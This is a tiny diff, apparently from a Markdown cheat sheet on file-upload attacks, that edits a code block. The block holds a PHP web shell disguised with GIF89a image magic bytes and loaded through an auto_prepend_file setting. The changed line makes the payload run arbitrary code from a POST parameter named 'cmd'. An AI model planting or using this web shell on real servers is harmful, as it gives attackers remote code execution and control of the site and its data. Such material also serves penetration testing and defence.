@@ -2054,7 +2054,7 @@ auto_prepend_file=GIF89a.jpg
 
 ```
 GIF89a
-<?=eval($_)?>
+<?=eval($_POST['cmd']);?>
 ```
 
 
